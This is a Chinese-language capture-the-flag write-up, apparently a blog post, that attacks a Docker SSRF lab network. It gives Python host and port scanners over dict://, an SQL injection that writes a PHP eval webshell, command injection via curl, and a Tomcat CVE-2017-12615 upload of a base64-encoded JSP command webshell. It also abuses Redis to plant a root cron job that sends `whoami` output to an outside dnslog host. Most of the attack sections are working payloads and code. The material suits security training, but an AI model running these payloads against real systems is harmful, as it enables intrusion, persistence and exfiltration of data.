    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.23

  <span class="token key atrule">ssrfweb4</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_commandexec<span class="token punctuation">:</span>v4
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.24

  <span class="token key atrule">ssrfweb5</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_xxe<span class="token punctuation">:</span>v5
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.25

  <span class="token key atrule">ssrfweb6</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_tomcat<span class="token punctuation">:</span>v6
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.26

  <span class="token key atrule">ssrfweb7</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_redisunauth<span class="token punctuation">:</span>v7
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.27

  <span class="token key atrule">ssrfweb8</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_redisauth<span class="token punctuation">:</span>v8
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.28

  <span class="token key atrule">ssrfweb9</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_mysql<span class="token punctuation">:</span>v9
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.29
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br></div></div><p>启动：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">docker</span> compose up <span class="token parameter variable">-d</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="入口点-http-192-168-245-140-8090"><a href="#入口点-http-192-168-245-140-8090" class="header-anchor">#</a> 入口点 http://192.168.245.140:8090/</h2> <p>ssrf文件读取</p> <p>url=file:///etc/passwd</p> <p>存在ssrf漏洞，file协议查看index.php源代码</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/2.png" alt="2"></p> <p>获取当前主机ip信息192.168.100.21，收集网络信息</p> <p>file:///etc/hosts 的快照如下：</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
192.168.100.21	7e68593461ed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>使用dict协议扫描内网存活主机</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url<span class="token operator">=</span><span class="token string">&quot;http://192.168.245.140:8090/&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip<span class="token operator">=</span><span class="token string">&quot;192.168.100.&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;dict://</span><span class="token interpolation"><span class="token punctuation">{</span>ip<span class="token punctuation">}</span></span><span class="token string">/&quot;</span></span><span class="token punctuation">}</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1.5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token operator">+</span><span class="token string">&quot;存活&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*]：扫描结束&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>存活主机列表</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>192.168.100.1存活
192.168.100.21存活
192.168.100.22存活
192.168.100.23存活
192.168.100.24存活
192.168.100.26存活
192.168.100.27存活
192.168.100.28存活
192.168.100.29存活
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>通过dict协议扫描目标端口返回特征指纹，信息不同，可以判断服务是否存活</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/2.png" alt="2"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

ips <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">&quot;192.168.100.21&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.22&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.23&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.24&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.25&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.26&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.27&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.28&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;192.168.100.29&quot;</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://192.168.245.140:8090/&quot;</span>
ports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">,</span> <span class="token number">3306</span><span class="token punctuation">]</span>  <span class="token comment"># 支持 Web、Redis 和 MySQL 端口</span>

<span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
    <span class="token keyword">for</span> port <span class="token keyword">in</span> ports<span class="token punctuation">:</span>
        target <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>ip<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;url&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;dict://&quot;</span> <span class="token operator">+</span> target
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&quot;HTTP/1.1&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - Web 服务&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token string">&quot;NOAUTH Authentication required&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - Redis 服务(需密码认证)&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token string">&quot;+OK&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - Redis 服务(未授权漏洞)&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token string">&quot;mysql_native_password&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - MySQL 服务(需密码认证)&quot;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - 请求超时&quot;</span></span><span class="token punctuation">)</span>  <span class="token comment"># 超时处理</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string"> - 错误: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] - 扫描结束&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>探测信息</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>192.168.100.21:80 - Web 服务
192.168.100.22:80 - Web 服务
192.168.100.23:80 - Web 服务
192.168.100.24:80 - Web 服务
192.168.100.26:8080 - Web 服务
192.168.100.27:6379 - Redis 服务(未授权漏洞)
192.168.100.28:6379 - Redis 服务(需密码认证)
192.168.100.29:3306 - MySQL 服务(需密码认证)
[*] - 扫描结束
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="_192-168-100-22-80-代码注入"><a href="#_192-168-100-22-80-代码注入" class="header-anchor">#</a> 192.168.100.22:80 代码注入</h2> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/3.png" alt="3"></p> <p>存在shell.php，代码执行</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/4.png" alt="4"></p> <p>url里的参数需要进行一次url编码，在ssrf时，确保可以正常解析</p> <p>有命令执行，但是没有写的权限，tmp目录可以写</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/5.png" alt="5"></p> <h2 id="_192-168-100-23-80-sql注入"><a href="#_192-168-100-23-80-sql注入" class="header-anchor">#</a> 192.168.100.23:80 SQL注入</h2> <p>存在sql注入漏洞，写个shell进去，空格要用%20，整体的参数再进行一次url编码</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># payload</span>
?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union%20select%201,2,3,'</span><span class="token operator">&lt;</span>?<span class="token operator">=</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>eval<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token string">'%20into%20outfile%20'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php<span class="token string">'%23
# url编码
%3Fid%3D-1'</span><span class="token keyword">union</span><span class="token operator">%</span><span class="token number">2520</span>select<span class="token operator">%</span><span class="token number">25201</span><span class="token operator">%</span><span class="token number">2</span>C2<span class="token operator">%</span><span class="token number">2</span>C3<span class="token operator">%</span><span class="token number">2</span>C<span class="token string">'%3C%3F%3Dhighlight_file(__FILE__)%3Beval(%24_GET%5B1%5D)%3B%3F%3E'</span><span class="token operator">%</span><span class="token number">2520</span>into<span class="token operator">%</span><span class="token number">2520</span>outfile<span class="token operator">%</span><span class="token number">2520</span><span class="token string">'%2Fvar%2Fwww%2Fhtml%2F1.php'</span><span class="token operator">%</span><span class="token number">2523</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>成功写入shell</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/6.png" alt="6"></p> <h2 id="_192-168-100-24-80-命令执行"><a href="#_192-168-100-24-80-命令执行" class="header-anchor">#</a> 192.168.100.24:80 命令执行</h2> <p>在192.168.100.24:80端口，一个ping命令测试，看起来是<code>system('ping $_GET[ip]')</code></p> <p>尝试get请求没有变化，看起来是post请求</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/7.png" alt="7"></p> <p>在已经拿到shell的主机22,23上尝试使用curl命令发送post请求</p> <p>22主机上没有curl命令，23主机上存在curl命令</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/8.png" alt="8"></p> <p>使用23主机curl命令发送post请求</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl%20&quot;http://192.168.100.24/&quot;%20-X%20POST%20-d%20&quot;ip=127.0.0.1;ls&quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># url编码</span>
%3F1%3Dsystem<span class="token punctuation">(</span><span class="token string">'curl%2520%22http%3A%2F%2F192.168.100.24%2F%22%2520-X%2520POST%2520-d%2520%22ip%3D127.0.0.1%3Bls%22'</span><span class="token punctuation">)</span>%3B
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>成功RCE</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/9.png" alt="9"></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl%20&quot;http://192.168.100.24/&quot;%20-X%20POST%20-d%20&quot;ip=127.0.0.1;touch%201111;ls%20-lah&quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># url编码</span>
<span class="token number">1</span>%3Dsystem<span class="token punctuation">(</span><span class="token string">'curl%2520%22http%3A%2F%2F192.168.100.24%2F%22%2520-X%2520POST%2520-d%2520%22ip%3D127.0.0.1%3Btouch%25201111%3Bls%2520-lah%22'</span><span class="token punctuation">)</span>%3B
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>还是没有写的权限，只能用题目提供的shell</p> <h2 id="_192-168-100-25-80-xxe"><a href="#_192-168-100-25-80-xxe" class="header-anchor">#</a> 192.168.100.25:80   XXE</h2> <p>我的25怎么死了</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/10.png" alt="10"></p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/11.png" alt="11"></p> <h2 id="_192-168-100-26-8080-tomcat-8-5-19-cve-2017-12615"><a href="#_192-168-100-26-8080-tomcat-8-5-19-cve-2017-12615" class="header-anchor">#</a> 192.168.100.26:8080 Tomcat/8.5.19 CVE-2017-12615</h2> <p>tomcat 8.5.19 版本存在漏洞，使用23主机的curl命令发送put请求，测试能否写入文件</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl%20-X%20PUT%20-H%20&quot;Content-Type:%20application/x-www-form-urlencoded&quot;%20-d%20&quot;1111&quot;%20http://192.168.100.26:8080/1.jsp/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># url编码</span>
%3F1%3Dsystem<span class="token punctuation">(</span><span class="token string">'curl%2520-X%2520PUT%2520-H%2520%22Content-Type%3A%2520application%2Fx-www-form-urlencoded%22%2520-d%2520%221111%22%2520http%3A%2F%2F192.168.100.26%3A8080%2F1.jsp%2F'</span><span class="token punctuation">)</span>%3B
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/12.png" alt="12"></p> <p>写入成功</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/13.png" alt="13"></p> <p>尝试写入webshell</p> <p>在system函数里，使用反引号解码base64编码的webshell，避免webshell里的特殊字符导致解析失败</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'a=`echo%20PCUKUHJvY2VzcyBwcm9jZXNzID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOwpqYXZhLmlvLklucHV0U3RyZWFtIGlucHV0U3RyZWFtID0gcHJvY2Vzcy5nZXRJbnB1dFN0cmVhbSgpOwpqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyIGJ1ZmZlcmVkUmVhZGVyID0gbmV3IGphdmEuaW8uQnVmZmVyZWRSZWFkZXIobmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoaW5wdXRTdHJlYW0pKTsKU3RyaW5nIGxpbmU7CndoaWxlICgobGluZSA9IGJ1ZmZlcmVkUmVhZGVyLnJlYWRMaW5lKCkpICE9IG51bGwpIHsKICAgIHJlc3BvbnNlLmdldFdyaXRlcigpLnByaW50bG4obGluZSk7Cn0KJT4=|base64%20-d`;curl%20-X%20PUT%20-H%20&quot;Content-Type:%20application/x-www-form-urlencoded&quot;%20-d%20&quot;$a&quot;%20http://192.168.100.26:8080/2.jsp/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># url编码</span>
%3F1%3Dsystem<span class="token punctuation">(</span><span class="token string">'a%3D%60echo%2520PCUKUHJvY2VzcyBwcm9jZXNzID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOwpqYXZhLmlvLklucHV0U3RyZWFtIGlucHV0U3RyZWFtID0gcHJvY2Vzcy5nZXRJbnB1dFN0cmVhbSgpOwpqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyIGJ1ZmZlcmVkUmVhZGVyID0gbmV3IGphdmEuaW8uQnVmZmVyZWRSZWFkZXIobmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoaW5wdXRTdHJlYW0pKTsKU3RyaW5nIGxpbmU7CndoaWxlICgobGluZSA9IGJ1ZmZlcmVkUmVhZGVyLnJlYWRMaW5lKCkpICE9IG51bGwpIHsKICAgIHJlc3BvbnNlLmdldFdyaXRlcigpLnByaW50bG4obGluZSk7Cn0KJT4%3D%7Cbase64%2520-d%60%3Bcurl%2520-X%2520PUT%2520-H%2520%22Content-Type%3A%2520application%2Fx-www-form-urlencoded%22%2520-d%2520%22%24a%22%2520http%3A%2F%2F192.168.100.26%3A8080%2F2.jsp%2F'</span><span class="token punctuation">)</span>%3B
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>base64解码的webshell内容</p> <div class="language-jsp line-numbers-mode"><pre class="language-text"><code>&lt;%
Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
java.io.InputStream inputStream = process.getInputStream();
java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
String line;
while ((line = bufferedReader.readLine()) != null) {
    response.getWriter().println(line);
}
%&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/14.png" alt="14"></p> <p>还是一台root权限的主机哎</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/15.png" alt="15"></p> <h2 id="_192-168-100-27-6379-redis未授权"><a href="#_192-168-100-27-6379-redis未授权" class="header-anchor">#</a> 192.168.100.27:6379 Redis未授权</h2> <p><code>dict</code>协议除了可以探测主机存活，还可以攻击未授权redis服务</p> <p>dict协议探测redis，返回了<code>+OK</code>，说明直接连接成功</p> <p>redis玩法很多</p> <ul><li>写入webshell</li> <li>写入ssh密钥</li> <li>定时任务</li></ul> <p>这台主机在内网，如果不考虑搭建内网代理流量，写入ssh密钥、定时任务反弹shell似乎也都用不到？</p> <p>试试写定时任务，使用curl，把命令执行结果带出来，好想法</p> <p>下面payload使用过程需要url编码，避免写入格式错误</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 清空 key</span>
dict://192.168.100.27:6379/flushall

<span class="token comment"># 设置要操作的路径为定时任务目录</span>
dict://192.168.100.27:6379/config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/

<span class="token comment"># 在定时任务目录下创建 root 的定时任务文件</span>
dict://192.168.100.27:6379/config <span class="token builtin class-name">set</span> dbfilename root

<span class="token comment"># dnslog带出命令执行结果</span>
dict://192.168.100.27:6379/set x <span class="token string">&quot;<span class="token entity" title="\n">\n</span>* * * * * /usr/bin/curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.snv1xj.dnslog.cn<span class="token entity" title="\n">\n</span>&quot;</span>

<span class="token comment"># 保存上述操作</span>
dict://192.168.100.27:6379/save
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/17.png" alt="17"></p> <h2 id="_192-168-100-28-6379-redis密码认证"><a href="#_192-168-100-28-6379-redis密码认证" class="header-anchor">#</a> 192.168.100.28:6379 Redis密码认证</h2> <p>在28主机80端口存在web服务</p> <p>在dict协议探测过程，28主机的web服务探测超时，使用http协议探测，可以访问到web服务</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/18.png" alt="18"></p> <p>首页，存在一个php 文件包含漏洞，同时存在一个有密码认证的redis服务</p> <p>php文件包含漏洞</p> <p>包含<code>/etc/passwd</code>，可以知道web服务是<code>apache</code></p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/19.png" alt="19"></p> <p>猜测apache配置文件目录<code>/etc/httpd/conf/httpd.conf</code></p> <p>配置文件里拿到关键信息，web根目录，apache根目录，日志相对路径</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>DocumentRoot &quot;/var/www/html&quot;
ServerRoot &quot;/etc/httpd&quot;
CustomLog &quot;logs/access_log&quot; combined
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><code>/etc/httpd/logs</code>在 CentOS/RHEL 系统中，这个目录通常是一个 软链接，指向真实的日志路径：/var/log/httpd</p> <p>那么实际日志目录就是<code>/var/log/httpd/access_log</code>，尝试文件包含，失败</p> <p>这个日志文件不存在，apache用户没有权限在这里写日志</p> <p>在容器里验证</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>sh-4.2<span class="token comment"># ls /var/log/httpd/ -lah</span>
total <span class="token number">8</span>.0K
drwx------ <span class="token number">2</span> root root <span class="token number">4</span>.0K Nov <span class="token number">16</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4</span>.0K May <span class="token number">29</span>  <span class="token number">2024</span> <span class="token punctuation">..</span>
